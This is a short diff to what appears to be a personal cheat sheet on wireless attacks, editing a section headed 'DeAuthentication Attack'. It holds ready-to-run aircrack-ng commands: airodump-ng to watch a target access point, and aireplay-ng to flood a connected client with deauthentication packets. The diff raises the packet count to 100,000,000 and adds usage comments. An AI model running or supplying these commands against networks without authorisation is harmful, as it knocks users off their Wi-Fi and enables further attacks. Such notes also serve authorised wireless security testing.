@@ -13,5 +13,5 @@
 
 
 // DeAuthentication Attack
-#airodump-ng --bssid <BSSID> --channel <CHANNEL> [MonitorModeInterface]
-#aireplay-ng --deauth 10000000 -a <AP_MAC_address> -c <connected_Client_STATION_mac> [MonitorModeInterface]
+#airodump-ng --bssid <BSSID> --channel <CHANNEL> [MonitorModeInterface]                   // keep it running
+#aireplay-ng --deauth 100000000 -a <AP_MAC_address> -c <connected_Client_STATION_mac> [MonitorModeInterface] // aireplay-ng --deauth [#Deauthpacket] -a [Network_MAC_AP] -c <connected_Client_STATION_mac> [MonitorModeInterface]
